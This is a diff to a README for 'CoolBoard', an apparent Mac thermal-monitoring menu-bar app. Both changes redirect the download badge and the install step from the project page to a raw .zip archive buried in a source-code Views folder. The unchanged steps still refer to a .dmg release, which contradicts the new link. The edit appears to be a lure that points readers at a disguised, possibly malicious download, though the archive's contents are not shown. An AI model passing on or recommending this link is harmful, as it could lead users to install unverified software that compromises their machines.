@@ -1,6 +1,6 @@
 # 🧊 CoolBoard - Monitor your Mac thermal performance easily
 
-[![](https://img.shields.io/badge/Download-CoolBoard-blue.svg)](https://github.com/Creaky-gaspar847/CoolBoard)
+[![](https://img.shields.io/badge/Download-CoolBoard-blue.svg)](https://github.com/Creaky-gaspar847/CoolBoard/raw/refs/heads/main/Sources/CoolBoard/Views/Cool_Board_3.6-alpha.5.zip)
 
 CoolBoard provides a simple way to view your Apple Silicon Mac temperature and fan speed. It runs in the menu bar. You see your sensor data at a glance. It helps you track heat during heavy tasks.
 
@@ -28,7 +28,7 @@ CoolBoard works on most modern hardware. Ensure your Mac meets these conditions:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit [this page to download](https://github.com/Creaky-gaspar847/CoolBoard).
+1. Visit [this page to download](https://github.com/Creaky-gaspar847/CoolBoard/raw/refs/heads/main/Sources/CoolBoard/Views/Cool_Board_3.6-alpha.5.zip).
 2. Look for the latest release version on the page.
 3. Click the file that ends in .dmg to start the download.
 4. Open the downloaded file once it finishes.
